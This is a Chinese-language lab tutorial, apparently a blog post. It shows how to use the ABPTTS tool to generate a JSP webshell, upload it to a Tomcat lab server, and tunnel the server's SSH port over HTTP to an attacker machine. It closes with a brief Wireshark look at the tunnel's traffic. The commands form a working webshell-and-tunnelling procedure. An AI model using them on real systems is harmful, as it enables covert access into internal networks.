**0x001**

各位朋友们好，这是我第一次发技术文章，如果有不对的地方，欢迎各位大佬前来指教

###  **环境：**

攻击机kali 192.168.125.129

靶机 内网Centos7 Tomcat 192.168.125.134

内网kali 192.168.125.135

###  **步骤一：环境配置**

在攻击机上安装python2模块

1.首先验证pip版本

pip
–version![1609829551_5ff40cafec75797f3020c.png!small](https://image.3001.net/images/20210105/1609829551_5ff40cafec75797f3020c.png!small)

2.如果显示为pip2继续安装没款，如不是pip2或者无pip2，先去安装pip2

pip install pycrypto

![1609829619_5ff40cf3efd7209db82da.png!small](https://image.3001.net/images/20210105/1609829619_5ff40cf3efd7209db82da.png!small)

pip install
httplib2![1609829647_5ff40d0f1678231dfa5df.png!small](https://image.3001.net/images/20210105/1609829647_5ff40d0f1678231dfa5df.png!small)

###  **步骤二：攻击过程**

在攻击机上用git命令把github上的ABPTTS包拉取下来

1.git clone <https://github.com/nccgroup/ABPTTS.git>

![1609829670_5ff40d26bd84ebdee5a4c.png!small](https://image.3001.net/images/20210105/1609829670_5ff40d26bd84ebdee5a4c.png!small)

2.进入ABPTTS文件目录下

cd ABPTTS

![1609829686_5ff40d36dcd6277c979f9.png!small](https://image.3001.net/images/20210105/1609829686_5ff40d36dcd6277c979f9.png!small)

3.使用python abpttsfactory.py -o webshell生成对应webshell，会在当前目录下生成webshell
文件，里面存放着jsp和aspx的webshell文件

![1609829724_5ff40d5ce292cfb89db1b.png!small](https://image.3001.net/images/20210105/1609829724_5ff40d5ce292cfb89db1b.png!small)

4.把生成的webshell上传到web服务器上（由于此处为演示，使用的是scp上传）

![1609829766_5ff40d8646e980757ac77.png!small](https://image.3001.net/images/20210105/1609829766_5ff40d8646e980757ac77.png!small)

5.浏览器访问<http://192.168.125.134:8081/abptts.jsp>，如下图所示为成功

![1609829785_5ff40d99ce000360606e3.png!small](https://image.3001.net/images/20210105/1609829785_5ff40d99ce000360606e3.png!small)

6.用Centos Tomcat 通过ssh 链接内网kali

![1609829803_5ff40dab802ecaf94bcfd.png!small](https://image.3001.net/images/20210105/1609829803_5ff40dab802ecaf94bcfd.png!small)

7.执行 python abpttsclient.py -c webshell/config.txt -u <http://192.168>.

125.134:8081/abptts.jsp -f 127.0.0.1:1234/127.0.0.1:22目的是把centos tomcat的22端口
映射到攻击机的1234端口

![1609829830_5ff40dc6ae9b586e0dc6a.png!small](https://image.3001.net/images/20210105/1609829830_5ff40dc6ae9b586e0dc6a.png!small)

8.在攻击机上使用ssh链接127.0.0.1:1234就直连到centos tomcat机器上了

![1609829885_5ff40dfd484a975e19cca.png!small](https://image.3001.net/images/20210105/1609829885_5ff40dfd484a975e19cca.png!small)

![1609829908_5ff40e14f0f6f198dd028.png!small](https://image.3001.net/images/20210105/1609829908_5ff40e14f0f6f198dd028.png!small)

###  **步骤三：流量分析**

1.使用wireshark进行抓包发现此隧道是走http协议，特征如下![1609829916_5ff40e1c7008bd7eceee8.png!small](https://image.3001.net/images/20210105/1609829916_5ff40e1c7008bd7eceee8.png!small)

